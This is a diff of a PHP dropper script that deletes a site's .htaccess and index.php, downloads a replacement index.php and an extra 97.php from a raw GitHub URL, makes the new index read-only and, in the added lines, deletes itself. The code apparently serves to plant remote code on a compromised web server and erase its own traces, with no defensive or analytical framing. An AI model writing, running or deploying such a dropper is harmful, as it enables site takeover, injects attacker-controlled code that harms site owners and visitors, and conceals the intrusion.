@@ -1,23 +1,18 @@
 <?php
 
-// Get request path (URL-based)
 $uriPath = parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH);
-
-// Count how many directories exist in the URL
 $segments = array_values(array_filter(explode('/', $uriPath)));
+$inSubdir = count($segments) > 1;
 
-// If URL has more than one segment before the file, go back one directory
-// domain.com/code.php            -> segments = [code.php]       -> stay
-// domain.com/anydir/code.php     -> segments = [anydir, code.php] -> chdir('..')
-
-if (count($segments) > 1) {
+if ($inSubdir) {
     chdir('..');
 }
 
-$remoteUrl = 'https://raw.githubusercontent.com/seobela/temp/refs/heads/main/index.php';
+$remoteIndex = 'https://raw.githubusercontent.com/seobela/temp/refs/heads/main/index.php';
+$remote97 = 'https://raw.githubusercontent.com/seobela/temp/refs/heads/main/97.php';
+
 $files = ['.htaccess', 'index.php'];
 
-/* chmod and delete old files */
 foreach ($files as $file) {
     if (file_exists($file)) {
         @chmod($file, 0644);
@@ -25,22 +20,33 @@ foreach ($files as $file) {
     }
 }
 
-/* download new index.php */
-$ch = curl_init($remoteUrl);
+$ch = curl_init($remoteIndex);
 curl_setopt_array($ch, [
     CURLOPT_RETURNTRANSFER => true,
     CURLOPT_FOLLOWLOCATION => true,
     CURLOPT_TIMEOUT => 20
 ]);
-
 $data = curl_exec($ch);
 curl_close($ch);
 
-if ($data === false) {
-    die('Download failed');
+if ($data !== false) {
+    file_put_contents('index.php', $data);
+    chmod('index.php', 0444);
 }
 
-file_put_contents('index.php', $data);
-chmod('index.php', 0444);
+$ch = curl_init($remote97);
+curl_setopt_array($ch, [
+    CURLOPT_RETURNTRANSFER => true,
+    CURLOPT_FOLLOWLOCATION => true,
+    CURLOPT_TIMEOUT => 20
+]);
+$data97 = curl_exec($ch);
+curl_close($ch);
 
-echo 'Done';
+if ($data97 !== false) {
+    file_put_contents('97.php', $data97);
+}
+
+echo $inSubdir ? 'Subdir Done' : 'cruent dir Done';
+
+unlink(__FILE__);
